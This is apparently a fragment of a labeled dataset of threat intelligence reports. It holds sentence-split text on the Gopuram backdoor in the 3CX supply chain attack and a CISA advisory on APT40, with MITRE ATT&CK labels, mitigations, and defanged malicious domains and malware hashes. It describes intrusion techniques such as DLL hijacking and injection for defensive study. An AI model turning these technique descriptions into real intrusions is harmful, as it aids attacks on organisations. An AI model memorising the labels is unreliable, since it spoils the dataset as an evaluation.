            "On one of the machines, we observed a DLL named guard64.dll, which was loaded into the infected 3CXDesktopApp.exe process.",
            "Interestingly enough, we opened an investigation into a case linked to that DLL on March 21, about a week before the supply chain attack was discovered.",
            "A DLL with that name was used in recent deployments of a backdoor that we dubbed \u201cGopuram\u201d and had been tracking internally since 2020.",
            "Three years ago, we were investigating an infection of a cryptocurrency company located in Southeast Asia.",
            "During the investigation, we found that Gopuram coexisted on victim machines with AppleJeus, a backdoor attributed to the Korean-speaking threat actor Lazarus. ",
            "Over the years, we observed few victims compromised with Gopuram, but the number of infections began to increase in March 2023.",
            "As it turned out, the increase was directly related to the 3CX supply chain attack.",
            "We found out that the threat actor specifically targeted cryptocurrency companies, dropping the following files on infected machines: C:\\Windows\\system32\\wlbsctrl.dll, a malicious library (MD5: 9f85a07d4b4abff82ca18d990f062a84); C:\\Windows\\System32\\config\\TxR\\<machine hardware profile GUID>.TxR.0.regtrans-ms, an encrypted shellcode payload. ",
            "Once dropped, wlbsctrl.dll becomes loaded on every startup by the IKEEXT service via DLL hijacking.",
            "We further saw DLLs with the names ualapi.dll and ncobjapi.dll being sideloaded into spoolsv.exe and svchost.exe, respectively. ",
            "The wlbsctrl.dll library is responsible for decrypting and executing the shellcode stored in the C:\\Windows\\System32\\config\\TxR directory.",
            "The decryption is notably performed through the CryptUnprotectData API function that uses a different encryption key internally on every machine.",
            "This makes it difficult for researchers to decrypt the payload from the file without physical access to the victim machines. ",
            "Snippet of the loading function using CryptUnprotectData The component loaded by the library is Gopuram\u2019s main module.",
            "As mentioned above, its name in the export directory is guard64.dll.",
            "The job of the main module is to connect to a C2 server and request commands.",
            "The backdoor implements commands that allow the attackers to interact with the victim\u2019s file system and create processes on the infected machine.",
            "Gopuram was additionally observed to launch in-memory modules.",
            "Just like the implants used in the 3CX campaign, Gopuram\u2019s modules are DLL files that include an export function named DllGetClassObject.",
            "We have observed eight modules so far: Module name Description Ping Pings a host specified in the argument. ",
            "Connect Connects to a given host via a socket and waits for the server to send data. ",
            "Registry Manipulates registry (lists, adds, deletes and exports keys). ",
            "Service Manipulates (creates, lists, starts, stops and deletes) services. ",
            "Timestomp Performs timestomping on files. ",
            "Inject Performs payload injections through syscalls via mapping a shellcode to a remote process and creating a remote thread. ",
            "KDU Kernel Driver Utility that allows an attacker to bypass driver signature enforcement.",
            "The utility is used to load an unsigned driver (MD5: F684E10FF1FFCDD32C62E73A11382896).",
            "The driver collects information about installed AV filters and writes it to the C:\\Windows\\System32\\catroot2\\edb.chk.log file. ",
            "Update Encrypts a provided payload",
            "and writes it to the C:\\Windows\\System32\\config\\TxR\\<machine hardware profile GUID>.TxR.0.regtrans-ms file. ",
            "Net Partially implements features of the net command: management of users, groups, sessions and network shares. ",
            "The discovery of the new Gopuram infections allowed us to attribute the 3CX campaign to the Lazarus threat actor with medium to high confidence.",
            "Our attribution is based on the following facts: While investigating an attack on a Southeast Asian cryptocurrency company in 2020, we found Gopuram coexisting on the same machine with the AppleJeus backdoor, which is attributed to Lazarus. ",
            "The Gopuram backdoor has been observed in attacks on cryptocurrency companies, which is aligned with the interests of the Lazarus threat actor. ",
            "While looking for additional implants that used the same loader shellcode as the 3CX implants, we discovered a sample on a multiscanner service (MD5: 933508a9832da1150fcfdbc1ca9bc84c) loading a payload that uses the wirexpro[.]com C2 server.",
            "The same server is listed as an IoC for an AppleJeus campaign by Malwarebytes. ",
            "First bytes of the loader shellcode used in 3CX and AppleJeus Note, though, that the shellcode is based on open-source code that has been used by other threat actors, for example, SilentBreak.",
            "Still, the use of that shellcode along with the 0xF558F4DA constant (which is the ROR13 hash for the string DllGetClassObject) is a more unique pattern. ",
            "While investigating a malicious MSI file (MD5: ec3f99dd7d9dbce8d704d407b086e84f) that has been uploaded to a multiscanner service, we observed the following two events: The dll library dropped from the MSI was observed to launch an in-memory payload that contacts the oilycargo[.]com domain.",
            "This domain name has previously been attributed to Lazarus by multiple researchers. ",
            "In our telemetry, we observed AvBugReport.exe, the executable hosting dll, to contain Gopuram\u2019s main module payload, guard64.dll. ",
            "These four facts allow us to conclude that Lazarus is likely the threat actor deploying the Gopuram backdoor. ",
            "As for the victims in our telemetry, installations of the infected 3CX software are located all over the world, with the highest infection figures observed in Brazil, Germany, Italy and France. ",
            "As the Gopuram backdoor has been deployed to less than ten infected machines, it indicates that attackers used Gopuram with surgical precision.",
            "We additionally observed that the attackers have a specific interest in cryptocurrency companies. ",
            "As it turns out, the infostealer is not the only malicious payload deployed during the 3CX supply chain attack.",
            "The threat actor behind Gopuram additionally infects target machines with the full-fledged modular Gopuram backdoor.",
            "We believe that Gopuram is the main implant and the final payload in the attack chain.",
            "Our investigation of the 3CX campaign is still far from complete.",
            "We will continue analyzing the deployed implants to find out more details about the toolset used in the supply chain attack. ",
            "Gopuram indicators of compromise MD5 hashes 9f85a07d4b4abff82ca18d990f062a84 96d3bbf4d2cf6bc452b53c67b3f2516a File paths C:\\Windows\\System32\\config\\TxR\\<machine hardware profile GUID>.TxR.0.regtrans-ms C:\\Windows\\system32\\catroot2\\edb.chk.log More indicators of compromise and YARA rules for detecting Gopuram components are available for TIP subscribers.",
            "Contact intelreports@kaspersky.com for more details. "
        ],
        "label": [
            [],
            [],
            [],
            [],
            [],
            [
                "T1140"
            ],
            [
                "T1140"
            ],
            [
                "T1105"
            ],
            [
                "T1041"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1027"
            ],
            [],
            [
                "T1574.002"
            ],
            [
                "T1140"
            ],
            [
                "T1106"
            ],
            [
                "T1140"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1095"
            ],
            [
                "T1112"
            ],
            [
                "T1543.003"
            ],
            [],
            [
                "T1055"
            ],
            [],
            [],
            [
                "T1518.001"
            ],
            [
                "T1027"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            []
        ]
    },
    {
        "doc_title": "AA21200A Tactics Techniques and Procedures of Indicted APT40 Actors Associated with Chinas MSS Hainan State Security Department",
        "cti_report": [
            "title: AA21-200A: Tactics, Techniques, and Procedures of Indicted APT40 Actors Associated with China\u2019s MSS Hainan State Security Department url: https://us-cert.cisa.gov/ncas/alerts/aa21-200a Original release date: July 19, 2021SummaryThis Joint Cybersecurity Advisory was written by the Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA) to provide information on a Chinese Advanced Persistent Threat (APT) group known in open-source reporting as APT40.",
            "This advisory provides APT40\u2019s tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help cybersecurity practitioners identify and remediate APT40 intrusions and established footholds. ",
            "APT40\u2014aka BRONZE MOHAWK, FEVERDREAM, G0065, Gadolinium, GreenCrash, Hellsing, Kryptonite Panda, Leviathan, MUDCARP, Periscope, Temp.",
            "Periscope, and Temp.",
            "Jumper\u2014is located in Haikou, Hainan Province, People\u2019s Republic of China (PRC), and has been active since at least 2009.",
            "APT40 has targeted governmental organizations, companies, and universities in a wide range of industries\u2014including biomedical, robotics, and maritime research\u2014across the United States, Canada, Europe, the Middle East, and the South China Sea area, as well as industries included in China\u2019s Belt and Road Initiative. ",
            "On July 19, 2021, the U.S. Department of Justice (DOJ) unsealed an indictment against four APT40 cyber actors for their illicit computer network exploitation (CNE) activities via front company Hainan Xiandun Technology Development Company (Hainan Xiandun).",
            "Hainan Xiandun employee Wu Shurong cooperated with and carried out orders from PRC Ministry of State Security (MSS) Hainan State Security Department (HSSD) intelligence officers Ding Xiaoyang, Zhu Yunmin, and Cheng Qingmin to conduct CNE.",
            "Wu\u2019s CNE activities resulted in the theft of trade secrets, intellectual property, and other high-value information from companies and organizations in the United States and abroad, as well as from multiple foreign governments.",
            "These MSS-affiliated actors targeted victims in the following industries: academia, aerospace/aviation, biomedical, defense industrial base, education, government, healthcare, manufacturing, maritime, research institutes, and transportation (rail and shipping). ",
            "Click here for a PDF version of this report. ",
            "(Updated July 19, 2021) Click here for indicators of compromise (IOCs) in STIX format. ",
            "Note: to uncover malicious activity, incident responders search for IOCs in network- and host-based artifacts and assess the results\u2014eliminating false positives during the assessment.",
            "For example, some MD5 IOCs in the STIX file identify legitimate tools\u2014such as Putty, cmd.exe, svchost.exe, etc.\u2014as indicators of compromise.",
            "Although the tools themselves are not malicious, APT 40 attackers placed and used them from non-standard folders on victim systems during computer intrusion activity.",
            "If a legitimate tool is identified by an incident responder, then the location of the tool should be assessed to eliminate false positives or uncover malicious activity.",
            "See Technical Approaches to Uncovering and Remediating Malicious Activity for more incident handling guidance. ",
            "Technical DetailsThis Joint Cybersecurity Advisory uses the MITRE ATT&CK:registered: framework, version 9.",
            "See the ATT&CK for Enterprise framework for all referenced threat actor tactics and techniques. ",
            "APT40",
            "[G0065] has used a variety of tactics and techniques and a large library of custom and open-source malware\u2014much of which is shared with multiple other suspected Chinese groups\u2014to establish initial access via user and administrator credentials, enable lateral movement once inside the network, and locate high value assets in order to exfiltrate data.",
            "Table 1 provides details on these tactics and techniques.",
            "Note: see the appendix for a list of the domains, file names, and malware MD5 hash values used to facilitate this activity. ",
            "Table 1: APT40",
            "ATT&CK Tactics and Techniques Tactics Activities and Techniques Reconnaissance [TA0043] and Resource Development [TA0042] Gathered victim identity information [T1589] by collecting compromised credentials [T1589.001] Acquire infrastructure",
            "[T1583] to establish domains that impersonate legitimate entities [T1583.001], aka \u2018typosquatting\u2019, to use in watering hole attacks and as command and control (C2)",
            "[TA0011] infrastructure Establish new [T1585.002] and compromise existing [T1586.002] email and social media accounts",
            "[1585.001] to conduct social engineering attacks Initial Access",
            "[TA0001] External remote services (e.g., virtual private network",
            "[VPN] services)",
            "[T1133] Spearphishing emails with malicious attachments [T1566.001] and links [T1566.002] Drive-by compromises",
            "[T1189] and exploitation of public-facing applications [T1190] Access to valid",
            "[T1078], compromised administrative [T1078.001] accounts Execution",
            "[TA0002] Command and scripting interpreters",
            "[T1059] such as PowerShell [T1059.001] Exploitation of software vulnerabilities in client applications to execute code",
            "[T1203] using lure documents that dropped malware exploiting various Common Vulnerabilities and Exposures (CVEs) ",
            "User execution",
            "[T1204] of malicious files [T1204.002] and links",
            "[T1566.002] attached to spearphishing emails [T1566.001] Persistence [TA0003], Privilege Escalation [TA0004], Credential Access",
            "[TA0006], Discovery [TA0007], and Lateral Movement",
            "[TA0008] APT40 has used a combination of tool frameworks and malware to establish persistence, escalate privileges, map, and move laterally on victim networks.",
            "Additionally, APT40 conducted internal spearphishing attacks [T1534]. BADFLICK/Greencrash China Chopper [S0020] Cobalt Strike [S0154] Derusbi/PHOTO [S0021] Gh0stRAT",
            "[S0032] GreenRAT jjdoor/Transporter jumpkick Murkytop (mt.exe)",
            "[S0233] NanHaiShu [S0228] Orz/AirBreak [S0229] PowerShell Empire",
            "[S0363] PowerSploit",
            "[S0194] Server software component: Web Shell [TA1505.003] Defense Evasion",
            "[TA0005], Command and Control",
            "[TA0011], Collection [TA0009], and Exfiltration [TA0010] Use of steganography [T1027.003] to hide stolen data inside other files stored on GitHub Protocol impersonation",
            "[T1001.003] by using Application Programming Interface (API) keys for Dropbox accounts in commands to upload stolen data to make it appear that the activity was a legitimate use of the Dropbox service Protocol tunneling [T1572] and multi-hop proxies",
            "[T1090.003], including the use of Tor [S0183] Use of domain typosquatting for C2 infrastructure [T1583.001] Archive [T1560], encrypt [T1532], and stage collected data locally",
            "[T1074.001] and remotely [T1074.002] for exfiltration Exfiltration over C2 channel [T1041] MitigationsNetwork Defense-in-Depth Proper network defense-in-depth and adherence to information security best practices can assist in mitigating the threat and reducing the risk.",
            "The following guidance may assist organizations in developing network defense procedures. ",
            "Patch and Vulnerability Management Install vendor-provided and verified patches on all systems for critical vulnerabilities, prioritizing timely patching of internet-connected servers and software processing internet data\u2014such as web browsers, browser plugins, and document readers. ",
            "Ensure proper migrating steps or compensating controls are implemented for vulnerabilities that cannot be patched in a timely manner. ",
            "Maintain up-to-date antivirus signatures and engines. ",
            "Routinely audit configuration and patch management programs to ensure the ability to track and mitigate emerging threats.",
            "Implementing a rigorous configuration and patch management program will hamper sophisticated cyber threat actors\u2019 operations and protect resources and information systems. ",
            "Review the articles in the References section for more information on Chinese APT exploitation of common vulnerabilities. ",
            "Protect Credentials Strengthen credential requirements, regularly change passwords, and implement multi-factor authentication to protect individual accounts, particularly for webmail and VPN access and for accounts that access critical systems.",
            "Do not reuse passwords for multiple accounts. ",
            "Audit all remote authentications from trusted networks or service providers. ",
            "Detect mismatches by correlating credentials used within internal networks with those employed on external-facing systems. ",
            "Log use of system administrator commands such as net, ipconfig, and ping. ",
            "Enforce principle of least privilege. ",
            "Network Hygiene and Monitoring Actively scan and monitor internet-accessible applications for unauthorized access, modification, and anomalous activities. ",
            "Actively monitor server disk use and audit for significant changes. ",
            "Log Domain Name Service (DNS) queries and consider blocking all outbound DNS requests that do not originate from approved DNS servers.",
            "Monitor DNS queries for C2 over DNS. ",
            "Develop and monitor the network and system baselines to allow for the identification of anomalous activity.",
            "Audit logs for suspicious behavior. ",
            "Identify and suspend access of users exhibiting unusual activity. ",
            "Use allowlist or baseline comparison to monitor Windows event logs and network traffic to detect when a user maps a privileged administrative share on a Windows system. ",
            "Leverage multi-sourced threat-reputation services for files, DNS, URLs, IP addresses, and email addresses. ",
            "Network device management interfaces\u2014such as Telnet, Secure Shell (SSH), Winbox, and HTTP\u2014should be turned off for wide area network (WAN) interfaces and secured with strong passwords and encryption when enabled. ",
            "When possible, segment critical information on air-gapped systems.",
            "Use strict access control measures for critical data. ",
            "APPENDIX:",
            "APT40 Indicators of Compromise APT40 used the following domains, file names, and malware MD5 hash values to facilitate the CNE activity outlined in this CSA between 2009 through 2018. ",
            "Domains airbusocean[.]com https://pastebin[.]com/vfb5mbbu pacifichydrologic[.]org cargillnotice[.]com huntingtomingalls[.]com philippinenewss[.]com ccidmeekparry[.]info indiadigest[.]in philstarnotice[.]com ccvzvhjhdf[.]website jack-newnb[.]com porndec143.chickenkiller[.]com cdigroups[.]com kAty197.chickenkiller[.]com santaclarasystem[.]us checkecc[.]com louisdreyfu[.]com scsnewstoday[.]com chemscalere[.]com mail2.ignorelist[.]com secbkav[.]com cnnzapmeta[.]com masterroot[.]pw Soure7788.chickenkiller[.]com corycs[.]com microsql-update[.]info tccoll[.]com deltektimes[.]com mihybb[.]com teledynegroup[.]com Engaction[.]com mlcdailynews[.]com teledyneinstrument[.]com ens-smithjonathan.rhcloud[.]com movyaction[.]net testdomain2019.chickenkiller[.]com fishgatesite.wordpress[.]com msusanode[.]com thestar[.]live goo2k88yyh2.chickenkiller[.]com newbb-news[.]com thrivedataview[.]com gttdoskip[.]com nfmybb[.]com thyssemkrupp[.]com http://gkimertds.wordpress[.]com/feed/ nmw4xhipveaca7hm[.]onion.link/en_US/all.js thyssenkrupp-marinesystems[.]org http://stackoverflow[.]com/users/3627469/angle-swift nobug[.]uk.to togetno992.mooo[.]com http://stackoverflow[.]com/users/3804206/swiftr-angle notesof992.wordpress[.]com tojenner97.chickenkiller[.]com http://stackoverflow[.]com/users/3863346/gkimertdssdads onlinenewspapers[.]club trafficeco[.]com vser.mooo[.]com onlineobl[.]com transupdate[.]com https://pastebin[.]com/p1mktQpD oyukg43t[.]website troubledate[.]com ultrasocial[.]info wsmcoff[.]com xbug.uk[.]to usdagroup[.]com www.yorkshire-espana-sa[.]com/english/servicios/ yootypes[.]com https://github[.]com/slotz/sharp-loader/commit/f9de338fb474fd970a7375030642d04179b9245d MD5 Malware Hashes (Updated July 19, 2021) Note: to uncover malicious activity, incident responders search for indicators of compromise (IOCs) in network- and host-based artifacts and assess the results\u2014eliminating false positives during the assessment.",
            "For example, some MD5 IOCs in the table below identify legitimate tools\u2014such as PuTTY, cmd.exe, svchost.exe, etc.\u2014as indicators of compromise.",
            "See Technical Approaches to Uncovering and Remediating Malicious Activity for more incident handling guidance. ",
            "01234c0e41fc23bb5e1946f69e6c6221 018d3c34a296edd32e1b39b7276dcf7f 019b68e26df8750e2f9f580b150b7293 01fa52a4f9268948b6c508fef0377299 022bd2040ec0476d8eb80d1d9dc5cc92 039d9ca446e79f2f4310dc7dcc60ec55 043f6cdca33ce68b1ebe0fd79e4685af 04918772a2a6ccd049e42be16bcbee39 04dc4ca70f788b10f496a404c4903ac6 060067666435370e0289d4add7a07c3b 062c759d04106e46e027bbe3b93f33ef 07083008885d2d0b31b137e896c7266c 079068181a728d0d603fe72ebfc7e910 0803f8c5ee4a152f2108e64c1e7f0233 09143a14272a29c56ff32df160dfdb30 0985f757b1b51533b6c5cf9b1467f388 09aab083fb399527f8ff3065f7796443 0b7bb3e23a1be2f26b9adf7004fc6b52 0b9a614a2bbc64c1f32b95988e5a3359 0bbe092a2120b1be699387be16b5f8fb 0bbe769505ca3db6016da400539f77aa 0c3c00c01f4c4bad92b5ba56bd5a9598 0c4fa4dfbe0b07d3425fea3efe60be1c 0ca936a564508a1f9c91cb7943e07c30 0d69eefede612493afd16a7541415b95 0da08b4bfe84eacc9a1d9642046c3b3c 0dd7f10fdf60fc36d81558e0c4930984 0e01ec14c25f9732cc47cf6344107672 10191b6ce29b4e2bddb9e57d99e6c471 105757d1499f3790e69fb1a41e372fd9 207e3c538231eb0fd805c1fc137a7b46 20e52d2d1742f3a3caafbac07a8aa99a 226042db47bdd3677bd16609d18930bd 22823fed979903f8dfe3b5d28537eb47 2366918da9a484735ec3a9808296aab8 239a22c0431620dc937bc36476e5e245 2499390148fc99a0f38148655d8059e7 24dbcd8e8e478a35943a05c7adfc87cc 25a06ab7675e8f9e231368d328d95344 25b79ba11f4a22c962fea4a13856da7f 25fc4713290000cdf01d3e7a0cea7cef 2639805ae43e60c8f04955f0fe18391c 270df5aab66c4088f8c9de29ef1524b9 280e5a3b9671db31cf003935c34f8cf9 28366de82d9c4441f82b84246369ad3b 28628f709a23d5c02c91d6445e961645 28c6f235946fd694d2634c7a2f24c1ba 29c1b4ec0bc4e224af2d82c443cce415 2b8a06d1de446db3bbbd712cdb2a70ce 2bf998d954a88b12dbec1ee96b072cb9 2c408385acdb04f0679167223d70192b 2c9737c6922b6ca67bf12729dcf038f9 2dd9aab33fcdd039d3a860f2c399d1b1 2de0e31fda6bc801c86645b37ee6f955 2e5b59c62e6e2f3b180db9453968d817 2ee7168c0cc6e0df13d0f658626474bb 2eee367a6273ce89381d85babeae1576 2f0a52ce4f445c6e656ecebbcaceade5 2f9995bc34452c789005841bc1d8da09 30701b1d1e28107f8bd8a15fcc723110 31a72e3bf5b1d33368202614ffd075db 3389dae361af79b04c9c8e7057f60cc6 33d18e29b4ecc0f14c20c46448523fc8 46e80d49764a4e0807e67101d4c60720 480f3a13998069821e51cda3934cc978 48101bbdd897877cc62b8704a293a436 48548309036005b16544e5f3788561dc 4a23e0f2c6f926a41b28d574cbc6ac30 4ab825dc6dabf9b261ab1cf959bfc15d 4b18b1b56b468c7c782700dd02d621f4 4b93159610aaadbaaf7f60bea69f21a4 4beb3f7fd46d73f00c16b4cc6453dcdb 4dd6eab0fa77adb41b7bd265cfb32013 4e79e2cade96e41931f3f681cc49b60a 4ef1c48197092e0f3dea0e7a9030edc8 503f8dc2235f96242063b52440c5c229 50527c728506a95b657ec4097f819be6 5064dc5915a46bfa472b043be9d0f52f 513f559bf98e54236c1d4379e489b4bc 51e21a697aec4cc01e57264b8bfaf978 51f31ed78cec9dbe853d2805b219e6e7 52b0f7d77192fe6f08b03f0d4ea48e46 53ceeaf0a67239b3bc4b533731fd84af 56a9ff904b78644dee6ef5b27985f441 56b18ba219c8868a5a7b354d60429368 56d6d3aa1297c62c6b0f84e5339a6c22 57849bb3949b73e2cd309900adafc853 5826e0bd3cd907cb24c1c392b42152ca 5875dfe9a15dd558ef51f269dcc407b5 58e7fd4530a212b05481f004e82f7bc1 5957ef4b609ab309ea2f17f03eb78b2d 5984955cbc41b1172ae3a688ab0246c5 59ce71ffb298a5748c3115bc834335bf 5a8d488819f2072caed31ead6aeaf2fc 5acac898428f6d20f6f085d79d86db9c 5b2cddac9ebd7b0cd3f3d3ac15026ffb 6f6d12da9e5cf8b4a7f26e53cc8e9fbd 700d2582ccb35713b7d1272aa7cfc598 70206725df8da51f26d6362e21d8fadb 70e0052d1a2828c3da5ae3c90bc969ea 7204c1f6f1f4698ac99c6350f4611391 72a7fd2b3d1b829a9f01db312fdd1cd7 7327993142260cee445b846a12cf4e85 7525bc47e2828464ce07fa8a0db6844f 76adaa87f429111646a27c2e60bda61e 76c5dca8dc9b1241b8c9a376abab0cc5 782202b09f72b3cfdc93ffb096ca27de 7836c4a36cc66d4bcbd84abb25857d21 78a0af31a5c7e4aee0f9acde74547207 7969dc3c87a3d5e672b05ff2fe93f710 7a09bf329b0b311cc552405a38747445 7a63ea3f49a96fa0b53a84e59f005019 7b3f959ab775032a3ca317ebb52189c4 7b710f9731ad3d6e265ae67df2758d50 7bd10b5c8de94e195b7da7b64af1f229 7c036ba51a3818ddc8d51cf5a6673da4 7c49efe027e489134ec317d54de42def 7d63f39fb0100a51ba6d8553ef4f34de 7ef6802fc9652d880a1f3eaf944ce4a3 7f7d726ea2ed049ab3980e5e5cb278a3 7fe679c2450c5572a45772a96b15fcb1 83076104ae977d850d1e015704e5730a 8361b151c51a7ad032ad20cecf7316f4 838ceb02081ac27de43da56bec20fc76 84865f8f1a2255561175ab12d090da7c 8520062de440b75f65217ff2509120f7 85862c262c087dd4470bb3b055ef8ea5 85e5b11d79a7570c73d3aa96e5a4e84d 85ecef9ca15e25835a9300a85f9bcd2a 9d3fd2ff608e79101b09db9e361ea845 9d5206f692577d583b93f1c3378a7a90 9e592d0918c029aa49635f03947026e8 9f847b3618b31ef05aebd81332067bd8 9fdd77dc358843af3d7b3f796580c29d a025881cd4ae65fab39081f897dc04fd a0e3561633bdf674b294094ffa06a362 a13715be3d6cbd92ed830a654d086305 a2256f050d865c4335161f823b681c24 a26e600652c33dd054731b4693bf5b01 a2c66a75211e05b20b86dd90ba534792 a2cb95be941b94f5488eab6c2eec7805 a320510258668504ed0140e7b58ee31e a34db95c0fcb78d9c5452f81254224eb a3c0151e0b6289376f383630a8014722 a42a91354d605165d2c1283b6b330539 a4711b8414445d211826b4da3f39de0a a4a70ce528f64521c3cd98dce841f6f3 a5ac89845910862cfef708b20acd0e44 a67fcb5dcfc9e3cfbfd7890e65d4f808 a68bf5fce22e7f1d6f999b7a580ae477 a6b9bbb87eb08168fc92271f69fa5825 a6cab9f2e928d71ed8ecf2c28f03a9a2 a7e4f42ad70ddd380281985302573491 a83b1aed22de71baee82e426842eeb48 a91dca76278cf4f4155eb1b0fc427727 a96dca187c3c001cad13440c3f7e77e8 aa73e7056443f1dd02480a22b48bdd46 aaafb1eeee552b0b676a5c6297cfc426 ab662cee6419327de86897029a619aeb ab8f72562d02156273618d1f3746855c abdb86d8b58b7394be841e0a4da9bec7 ace585625de8b3942cc3974cf476f8de beea0da01409b73be94b8a3ef01c4503 befc121916f9df7363fead1c8554df9a bf250a8c0c9a820cd1a21e3425acfe37 bfb0dcd9ef6ac6e016a8a5314d4ef637 bff56d7e963ea28176b0bcb60033635d c05e5bc5adb803b8a53cff7f95621c73 c0ad63a680fbdc75d54b270cbedb4739 c0d9f3a67a8df0ed737ceb9e15bacc47 c112456341a1c5519e7039ce0ba960fa c161f10fccecec67c589cdd24a05f880 c183e7319f07ccc591954068e15095db c2e023b46024873573db658d7977e216 c380675a29f47dba0b1401c7f8e149dc c3996bf709cad38d58907da523992e3b c583ae5235ddea207ac11fff4af82d9b c71f125fb385fed2561f3870b4593f18 c75a2b191da91114ceea80638bc54030 c78ee46ffbe5dd76d84fb6a74bf21474 c79b27fe1440b11a99a5611c9d6c6a78 c808d2ed8bb6b2e3c06c907a01b73d06 c8930a4fd33dcf18923d5cf0835272bd c8940976a63366f39cfcdc099701093b c89e8f0bc93d472a4f863a5fa7037286 c8a850a027fa4a3cdae7f87cc1c71ba0 cab21cb7ba1c45a926b96a38b0bdaaef cbe63b9c0c9ac6e8c0f5b357df737c5e cbfc1587f89f15a62f049e9e16cccf68 cd049c2b76c73510ae70610fd1042267 cd058dd28822c72360bc9950a6c56c45 cd427b4afea8032c77e907917608148a cd81267e9c82d24a9f40739fa6bf1772 cdc22f7913eb93d77d629e59ac2dc46a cdc585a1fd677da07163875cd0807402 e0b7e6c17339945bba43b8992a143485 e119a70f50132ae3afba3995fdf1aca6 e1512a0bf924c5a2b258ec24e593645a e195d22652b01a98259818cfbab98d33 e1ab3358b5356adefaffbc15bc43a3f9 e1b840bbf5b54aeb19e6396cab8f4c6a e26a29c0fc11cfb92936ab3374730b79 e284c25c50ba59d07a4fa947dc1a914a e3867f6e964a29134c9ea2b63713f786 e3eb703ef415659f711b6bc5604e131e e498718fd286aca7bb78858f4636f2db e4d2c63a73a0f1c6b5e60bde81ac0289 e5478fb5e8d56334d19d43cae7f9224a e5f7efcee5b15cf95a070a5cd05dbda9 e6348ee5beb9c581eeeaf4e076c5d631 e637f47c4f17c01a68539fcfcc4bc44f e63fbc864b7911be296c8ee0798f6527 e68f9b39caf116fb108ccb5c9c4ce709 e6a757114c0940b6d63c6a5925ade27f e6adc73df12092012f8cd246ba619f90 e8881037f684190d5f6cc26aab93d40f e890fa6fd8a98fec7812d60f65bf1762 e8bc927ee0ae288609e1c37665a3314e e8e73156316df88dee28214fb203658b e957c36c9d69d6a8256b6ddf7f806f56 e9ce9b35e2386bf442e22a49243a647e eadcae9ecba1097571c8d08e9b1c1a9c eb06648b43d34f20fc1c40e509521e99 eb5e5db77540516e6400a7912ad0ef0d eb5e999753f5ea094d59bdae0c66901c eb5ee94048730b321e35394a0fb10a5d eb64867dc48f757f0afe05dbf605b72d eb88f415336f0dccedfc93405330c561 fae03ff044d6bb488e1a6f1c6428c510 fc2142bd72bd520338f776146903be67 fc9b8262905a80cc5381d520813d556d fccd3de1df131f9d74949d69426c24af fcd912fd7ed80e2cdf905873c6ced4ad ff804e266a83974775814870cc49b66b 11166f8319c08c70fc886433a7dac92d 1223302912ec70c7c8350268a13ad226 139e071dd83304cdcfd5280022a0f958 13c93dc9186258d6c335b16dc7bb3c8c 14e2b0e47887c3bfbddb3b66012cb6e8 15437cfedfc067370915864feec47678 15e1816280d6c2932ff082329d0b1c76 166694d13ac463ea1c2bed64fbbb7207 16a344cd612cca4f0944ba688609e3ac 16c0011ea01c4690d5e76d7b10917537 1734a2b176a12eba8b74b8ca00ef1074 18144e860d353600bbd2e917aed21fde 1815c3a7a4a6d95f9298abb5855a3701 181a5b55b7987b62b5236965f473ba3b 18c26c5800e9e2482f1507c96804023e 1932ce50b7b6c88014cf082228486e5c 1af78c50aca90ee3d6c3497848ac5705 1b44fb4aaff71b1f96cd049a9461eaf5 1bb8f32e6e0e089d6a9c10737cf19683 1c35a87f61953baace605fff1a2d0921 1c945a6b0deccc6cd2f63c31f255d0ec 1cb216777039fe6a8464fc6a214c3c86 1d3a10846819a07eef66deefcc33459a 1dd6c80b4ea5d83aff4480dcbbef520c 1e91f0f52994617651e9b4a449af551a 1eb568559e335b3ed78588e5d99f9058 1ef9c42efe6e9a08b7ebb16913fa0228 1f2befede815fcf65c463bf875fcf497 1f9bdc0435ff0914605f01db8ca77a65 1ffd883095ff3279b31650ca3a50ad3c 34521c0f78d92a9d95e4f3ff15b516db 34681367cbcc3933f0f4b36481bde44e 34aa195c604d0725d7dd2aa4cc4efe28 354b95e858bcaced369ecbfdec327e2b 35f456afbe67951b3312f3b35d84ff0a 3647d11c155d414239943c8c23f6e8ec 37578c69c515f1d0d49769930fba25ce 375cbb0a88111d786c33510bff258a21 37b9b4ed979bd2cf818e2783499bfb5e 3810a18650dbacecd10d257312e92f61 3975740f65c2fa392247c60df70b1d6d 3a4ec0d0843769a937b5dadbe8ea56b1 3ab6bf23d5d244bc6d32d2626bd11c08 3bf8bb90d71d21233a80b0ec96321e90 3c2fe2dbdf09cfa869344fdb53307cb2 3c3d453ecf8cc7858795caece63e7299 3cbb46065f3e1dccbd707c340f38ce6b 3cf9dc0fdc2a6ab9b6f6265dc66b0157 3e89c56056e5525bf4d9e52b28fbbca7 3eb6f85ac046a96204096ab65bbd3e7e 3f50eedf4755b52aa7a7b740bd21daa6 3fefa55daeb167931975c22df3eca20a 4012acd80613aaa693a5d6cd4e7239ba 40528e368d323db0ac5c3f5e1efe4889 407c1ea99677615b80b2ffa2ed81d513 417949c717f78dc9e55ca81a5f7ade3e 4260e71d89f622c6a3359c5556b3aad7 429c10429a2ebb5f161e04159a59cf5b 4315975499cdc50098dbdb5b8aa4a199 44fa9c5df4ae20c50313aae02ba8fb95 4519b5d443a048a8599144900c4e1f28 45eb058edde4e5755a5ea1aff3ce3db7 460dc00ce690efacb5db8273c80e2b23 5b3050df93629f2f6cb3801ed19963c5 5b37ac4d642b96c4bf185c9584c0257a 5b3e945cd32a380f09ea98746f570758 5b72df8f6c110ae1d603354fcd8fe104 5c6f5cd81b099014718056e86b510fa2 5d63a3a02df2beda9d81f53abbd8264a 5d9c3cb239fa24bed2781bcf2898f153 5e353d1d17720c0f7c93f763e3565b3f 5f1c7f267fbe12210d3c80944f840332 5f393838220a6bf0cd9fd59c7cf97f5b 5f771966ef530ee0c2b42ef5cc46ad3a 6034ff91b376d653dc30f79664915b4e 603935efa89d93ea39b4b4d4a52ec529 607ea06890a6eedd723f629133576f20 60b2ce5ef4a076d1fa8675b584c27987 60cff7381b8fb64602816f9e5858930b 614909c72fa811ae41ea3d9b70122cee 6372d578e881abf76a4ec61e7a28da7d 63bf28f5dc6925a94c8b4e033a95be10 646cbeb4233948560ac50de555ea85ca 